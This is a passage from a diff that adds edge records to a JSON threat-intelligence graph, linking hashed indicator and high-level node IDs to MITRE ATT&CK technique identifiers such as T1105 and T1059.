+      "node_u": "HL_5fb6d8e856e0",
+      "node_v": "TTP_T1071",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_c28a71e563ff",
+      "node_u": "HL_c458c0a70a9d",
+      "node_v": "TTP_T1027",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_c2ed7cc2ae20",
+      "node_u": "IOC_3b38f5104ba9",
+      "node_v": "TTP_T1105",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_cf1fecc44522",
+      "node_u": "HL_1a612db4ac86",
+      "node_v": "TTP_T1105",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_d83af50301a1",
+      "node_u": "HL_c458c0a70a9d",
+      "node_v": "TTP_T1053",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_db31874291c7",
+      "node_u": "HL_180c8dd484f7",
+      "node_v": "TTP_T1059",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_ed231a5f7cec",
+      "node_u": "HL_ee5c1329124a",
+      "node_v": "TTP_T1219",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_0988a923a256",
+      "node_u": "IOC_ceb009fa7946",
+      "node_v": "TTP_T1036",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_12f488fd2d08",
+      "node_u": "HL_bf47d8fe871b",
+      "node_v": "TTP_T1059",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_287300b46ec8",
+      "node_u": "HL_180c8dd484f7",
+      "node_v": "TTP_T1566",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_2ddf7213b853",
+      "node_u": "HL_180c8dd484f7",
+      "node_v": "TTP_T1204",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_338cbeadfff9",
+      "node_u": "HL_6120e967f906",
+      "node_v": "TTP_T1027",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_3623380b8d0a",
+      "node_u": "HL_bf47d8fe871b",
+      "node_v": "TTP_T1105",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_3c804ff82e3c",
+      "node_u": "HL_335595ae46cd",
+      "node_v": "TTP_T1218",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_45313f61ddb3",
+      "node_u": "HL_4cc5ab71f383",
+      "node_v": "TTP_T1059",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_580af8f540cf",
+      "node_u": "HL_335595ae46cd",
+      "node_v": "TTP_T1204",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_6a44163a2a9f",
+      "node_u": "HL_4cc5ab71f383",
+      "node_v": "TTP_T1566",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_7006ab291dbf",
+      "node_u": "HL_f8b77c8fe4ea",
+      "node_v": "TTP_T1105",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_7a558495399a",
+      "node_u": "HL_4cc5ab71f383",
+      "node_v": "TTP_T1027",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_7a9031acde09",
+      "node_u": "HL_6120e967f906",
+      "node_v": "TTP_T1036",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_91547a18dfe8",
+      "node_u": "IOC_ceb009fa7946",
+      "node_v": "TTP_T1218",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_a9438c5ed178",
+      "node_u": "HL_6120e967f906",
+      "node_v": "TTP_T1566",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_abffd6f613be",
+      "node_u": "HL_e6b9ef29f5d3",
+      "node_v": "TTP_T1105",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_cebc593e3936",
+      "node_u": "HL_335595ae46cd",
+      "node_v": "TTP_T1105",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_d2bd068e4054",
+      "node_u": "HL_5a41715fe692",
+      "node_v": "TTP_T1036",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_e25463db7097",
+      "node_u": "HL_1385cae28d95",
+      "node_v": "TTP_T1105",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_f213d30736e4",
+      "node_u": "HL_180c8dd484f7",
+      "node_v": "TTP_T1105",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_f26944381037",
+      "node_u": "IOC_ceb009fa7946",
+      "node_v": "TTP_T1105",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_fca7cd8a6086",
+      "node_u": "HL_335595ae46cd",
+      "node_v": "TTP_T1059",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_098611420873",
+      "node_u": "HL_44463ac59fa0",
+      "node_v": "TTP_T1059",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_1bcf824222e5",
+      "node_u": "HL_153928bf9609",
+      "node_v": "TTP_T1059",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_226c4d6f4883",
+      "node_u": "HL_1385cae28d95",
+      "node_v": "TTP_T1027",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_291a5e159f4a",
+      "node_u": "HL_153928bf9609",
+      "node_v": "TTP_T1027",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_40422d3334f9",
+      "node_u": "HL_153928bf9609",
+      "node_v": "TTP_T1105",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_493e1f6edd00",
+      "node_u": "HL_51c9daeb24d8",
+      "node_v": "TTP_T1204",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_5c80a811f00e",
+      "node_u": "HL_44463ac59fa0",
+      "node_v": "TTP_T1204",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_63cbac443576",
+      "node_u": "HL_153928bf9609",
+      "node_v": "TTP_T1140",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_85f03ccca4ab",
+      "node_u": "HL_153928bf9609",
+      "node_v": "TTP_T1204",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_8b39c4d60f27",
+      "node_u": "HL_51c9daeb24d8",
+      "node_v": "TTP_T1566",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_ad6f6c5ab2ea",
+      "node_u": "HL_229e990e839d",
+      "node_v": "TTP_T1059",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_cc453af7e1de",
+      "node_u": "HL_229e990e839d",
+      "node_v": "TTP_T1204",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_585d8d9e5785__3767599d",
+      "node_u": "HL_b3e5c62fd3dd",
+      "node_v": "TTP_T1204",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_a3f3d77ee82a__6705c7f0",
+      "node_u": "HL_b3e5c62fd3dd",
+      "node_v": "TTP_T1059",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_1b020f1dbc05",
+      "node_u": "HL_b3e5c62fd3dd",
+      "node_v": "TTP_T1105",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_725ee8f9b421",
+      "node_u": "HL_b3e5c62fd3dd",
+      "node_v": "TTP_T1115",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_2eb090cf20dc",
+      "node_u": "HL_b3e5c62fd3dd",
+      "node_v": "TTP_T1027",
+      "edge_type": "high_level-ttp"
+    }
+  ]
+}
